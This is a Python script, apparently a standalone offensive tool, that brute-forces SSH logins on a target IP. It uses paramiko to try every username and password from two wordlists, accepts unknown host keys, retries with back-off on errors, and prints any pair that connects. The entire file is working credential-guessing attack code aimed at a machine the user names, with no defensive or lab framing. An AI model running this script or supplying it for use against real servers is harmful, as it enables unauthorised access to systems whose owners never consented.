import paramiko
import time
import Util
import sys
from optparse import OptionParser

def connection(ssh):
    try:
        ssh.connect(server, port, username, password)
        print("\n")
        print("\n[----] Connected successfully. Username = " + username + " and Password = " + password)
        print("\n")
    except paramiko.AuthenticationException as error:
        pass
    except paramiko.SSHException as error:
        return -1
    except Exception as error:
        print("\nUnknown error: {} processing {} and password {} " .format(error, username, password))
        pass

    return 1


def attempt(server, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        r = connection(ssh)
        ssh.close()

    except Exception as error:
        print("\n {}".format(error))
        return 1

    return r


def main():
    usage = '{} [-i targetIp] [-U usernamesFile] [-P passwordsFile]'.format(sys.argv[0])
    optionParser = OptionParser(usage=usage)
    optionParser.add_option('-i', action="store", type="string", dest='targetIp', help='Ip to attack')
    optionParser.add_option('-p', action="store", type="string", dest='targetPort', help='Ip port to attack', default=22)
    optionParser.add_option('-U', action="store", type="string", dest='usernamesFile', help='Username List file')
    optionParser.add_option('-P', action="store", type="string", dest='passwordsFile', help='Password List file')

    (options, args) = optionParser.parse_args()

    if not options.targetIp or not options.usernamesFile or not options.passwordsFile:
        optionParser.print_help()
        sys.exit(1)

    return options


if __name__ == "__main__":
    opt = main()
    option_dict = vars(opt)

    usernames = Util.fileContentsToList(option_dict["usernamesFile"])
    passwords = Util.fileContentsToList(option_dict["passwordsFile"])
    server = option_dict["targetIp"]
    port = option_dict["targetPort"]

    print("[*] Brute force initialized ...")
    print("[*] Loaded " + str(len(usernames)) + " users ...")
    print("[*] Loaded " + str(len(passwords)) + " passwords ...")

    i = 0

    for username in usernames:
        for password in passwords:
            i = i + 1
            print("\r[*] Iterations {}".format(i), end="")
            ret = -1
            try:
                retry = 0
                while ret == -1:
                    ret = attempt(server, port, username, password)
                    if ret == -1:
                        retry = retry + 1
                        if retry == 1:
                            print("\n[***] Error processing {} pwd {} . "
                                  "Retrying {} time(s)".format(username, password, retry), end="")
                        else:
                            print("\r[***] Error processing {} pwd {} . "
                                  "Retrying {} time(s)".format(username, password, retry), end="")
                        time.sleep(30 * retry)
                    else:
                        time.sleep(0.4)
                if retry > 0:
                    print("")
            except:
                print('\nError')

    print("\n[*] {} combinations tested".format(i))
    print("[*] Brute force finished")
